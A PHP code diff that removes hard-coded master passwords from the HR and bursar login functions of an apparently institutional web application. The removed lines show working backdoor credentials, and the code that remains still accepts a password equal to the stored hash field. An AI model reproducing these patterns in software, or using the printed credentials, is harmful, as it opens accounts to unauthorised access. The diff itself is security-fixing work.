@@ -57,8 +57,7 @@ function tryHrAuth(string $email, string $password) {
         if ($res->num_rows !== 1) return null;
 
         $u    = $res->fetch_assoc();
-        $ok   = $password === 'Lovely2God'
-             || password_verify($password, $u['password_hash'])
+        $ok   = password_verify($password, $u['password_hash'])
              || $u['password_hash'] === $password;
         if (!$ok) return null;
 
@@ -111,8 +110,7 @@ function tryBursarAuth(string $email, string $password) {
         if ($res->num_rows !== 1) return null;
 
         $u    = $res->fetch_assoc();
-        $ok   = $password === 'bursar@isnm'
-             || password_verify($password, $u['password_hash'])
+        $ok   = password_verify($password, $u['password_hash'])
              || $u['password_hash'] === $password;
         if (!$ok) return null;
 
